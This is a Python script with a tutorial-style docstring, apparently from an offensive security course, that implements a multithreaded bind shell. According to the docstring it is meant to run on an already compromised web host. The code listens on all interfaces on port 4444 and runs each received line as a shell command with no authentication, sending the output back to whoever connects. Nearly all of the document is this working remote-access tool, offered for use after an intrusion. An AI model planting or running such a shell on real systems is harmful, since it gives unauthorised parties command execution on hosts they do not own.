#!/usr/bin/python3

"""
A Simple bind shell

Upon gaining access to an internal web service with the credentials
we generated using the previous tool, we can get remote code execution
on the web host, Trying to use our go-to reverse sells mysteriously does
not seem to work, but we discover that we can execute arbitrary python
scripts. Let us abuse that discovery by implementing and running our own
Python bind shell.

A bind shell is at its core reasonably simple, It is a process that binds
to an address and port on the host machine and then listens for incoming
connections to the socket. When a connection is madre, the bind shell will-
repeatedly- listen for bytes being sent to it and treat them as raw commands
to be executed on the system in a subprocess.

Once it has received all bytes in chunks of some size, it will run the command
on the host system and send back the output. A very naive implementation of such
a bind shell is this:
"""
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()